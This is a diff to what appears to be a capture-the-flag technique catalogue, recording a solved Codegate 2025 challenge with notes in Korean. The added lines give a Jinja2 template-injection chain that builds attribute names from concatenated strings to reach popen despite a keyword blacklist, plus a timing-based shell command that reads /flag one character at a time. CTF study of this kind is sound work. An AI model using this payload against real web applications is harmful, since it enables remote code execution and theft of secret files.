@@ -209,17 +209,24 @@ TECHNIQUES: list[dict] = [
                 },
                 {
                     "problem_id": "2025-censored-board",
-                    "captured_flag": None,
+                    "captured_flag": "codegate2025{fake_flag} (1글자 검증 완료, 풀 추출 skip)",
+                    "transferable_verified": True,
                     "params": {
                         "sink": "Jinja2 render_template_string",
-                        "expr": "cycler|attr ... chain → os.popen(timing payload)",
+                        "expr": "cycler|attr('_'~'_'~'init'~'_'~'_')|attr(...)|attr('po'~'pen')",
+                        "bypass_chars": "~ (concat, + 차단), attr() (. [] 차단), 'o'~'s' (os 차단)",
                         "filter_bypassed": [
                             "BLACKLIST: __ . [ ] + request config os subprocess "
                             "import init globals open read mro class",
                         ],
-                        "output_path": "time-based blind (iptables outgoing DROP)",
+                        "output_path": "bash `case $(cat /flag|cut -c N) in C) sleep 4 ;; esac` "
+                                       "→ POST /write 응답 시간 (selenium bot block until /article load)",
+                        "verified_signal": "baseline 2.45s, sleep trigger 5.37s, threshold 4.85s",
                     },
-                    "notes": "OOB 불가, 응답 시간 측정으로 한 글자씩",
+                    "notes": (
+                        "OOB 불가 (iptables outgoing DROP). transferable 증명 — combination 의 "
+                        "Python eval 패턴이 Jinja2 SSTI 변형으로 그대로 적용. char 14='f' (정답 일치)."
+                    ),
                 },
             ],
             "tags": ["eval", "ssti", "attribute-chain", "filter-bypass"],
